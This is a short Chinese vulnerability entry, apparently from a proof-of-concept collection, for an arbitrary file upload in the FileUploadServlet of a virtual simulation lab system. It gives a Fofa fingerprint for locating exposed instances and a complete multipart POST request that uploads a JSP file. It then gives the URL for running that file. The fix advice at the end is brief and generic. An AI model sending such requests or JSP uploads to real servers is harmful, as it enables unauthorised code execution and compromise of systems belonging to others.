# 北京润尼尔科技股份有限公司虚拟仿真实验室系统FileUploadServlet存在任意文件上传

- **系统**：北京润尼尔科技股份有限公司虚拟仿真实验室系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/images/rdm.ico"`
- **请求**：`POST /chatroom/FileUploadServlet HTTP/1.1`

**请求体 / payload**
```
1. Fofa
body="/images/rdm.ico"
2、隐患url,复现如下
Host:
Cookie: JSESSIONID=D608C8AF5AC63FB5DA57B858CFC42B42
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGIc4ig8R
Content-Length: 153
------WebKitFormBoundaryGIc4ig8R
Content-Disposition: form-data; name="aaa"; filename="1234.jsp"
<% out.println("435352Els1K9wZvOlSsdsdmrg"); %>
------WebKitFormBoundaryGIc4ig8R--
3、上传访问
/chatroom/uploadFile/1234.jsp
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。